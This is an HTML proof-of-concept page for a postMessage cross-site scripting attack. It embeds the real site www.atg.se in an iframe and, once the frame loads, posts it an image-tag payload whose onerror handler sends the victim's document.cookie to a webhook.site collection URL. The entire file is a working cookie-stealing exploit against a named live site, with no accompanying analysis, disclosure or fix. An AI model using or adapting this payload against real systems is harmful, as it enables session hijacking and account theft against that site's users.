<!doctype html>
<html>
    <head>
        <title>PoC: postMessage XSS</title>
    </head>
    <body>
        <h1>Trying postMessage injection...</h1>

        <iframe
            id="atg"
            sandbox="allow-scripts allow-same-origin"
            src="https://www.atg.se"
            style="width: 100%; height: 800px"
        ></iframe>

        <script>
            const iframe = document.getElementById("atg");

            // Payload to be sent to the iframe
            const payload = `<img src=x onerror="fetch('https://webhook.site/eef7ef2d-c300-4fb6-a4f5-945a74a36ff6?c='+document.cookie)">`;

            iframe.onload = () => {
                iframe.contentWindow.postMessage(payload, "*");
                console.log("Payload sent via postMessage");
            };
        </script>
    </body>
</html>
